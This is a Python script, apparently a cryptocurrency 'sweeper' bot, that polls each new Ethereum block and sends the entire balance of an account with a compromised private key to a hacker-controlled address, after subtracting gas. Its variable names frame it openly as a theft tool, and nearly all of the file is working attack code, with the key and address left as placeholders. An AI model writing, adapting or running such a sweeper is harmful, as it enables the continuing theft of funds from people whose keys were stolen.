import time

from eth_account import Account
from eth_account.datastructures import SignedTransaction
from eth_account.signers.local import LocalAccount
from eth_typing import ChecksumAddress
from hexbytes import HexBytes
from web3 import Web3
from web3.types import Wei, TxParams

ETH_HTTP_URL: str = 'https://eth.llamarpc.com'
ETH_CHAIN_ID: int = 1

COMPROMISED_KEY: str = "private_key"

HACKER_ADDRESS: ChecksumAddress = Web3.to_checksum_address('address')
TRANSFER_GAS_LIMIT: int = 21000

w3: Web3 = Web3(Web3.HTTPProvider(ETH_HTTP_URL))
compromised: LocalAccount = Account.from_key(COMPROMISED_KEY)


def sweep() -> None:
    gas_price: Wei = w3.eth.gas_price
    account_balance: Wei = w3.eth.get_balance(compromised.address)

    if account_balance < gas_price * TRANSFER_GAS_LIMIT:
        return

    transaction: TxParams = {
        'chainId': ETH_CHAIN_ID,
        'from': compromised.address,
        'to': HACKER_ADDRESS,
        'value': account_balance - (gas_price * TRANSFER_GAS_LIMIT),
        'nonce': w3.eth.get_transaction_count(compromised.address),
        'gas': TRANSFER_GAS_LIMIT,
        'gasPrice': gas_price
    }

    signed: SignedTransaction = compromised.sign_transaction(transaction)

    tx_hash: HexBytes = w3.eth.send_raw_transaction(signed.rawTransaction)
    w3.eth.wait_for_transaction_receipt(tx_hash)

    print(f'Sweep transaction: {tx_hash.hex()}')


def main() -> None:
    block_filter = w3.eth.filter('latest')
    interval = 1

    while True:
        for block_hash in block_filter.get_new_entries():
            block = w3.eth.getBlock(block_hash)
            print(f"New Block: {block.number}")
            sweep()
        time.sleep(interval)


if __name__ == '__main__':
    main()
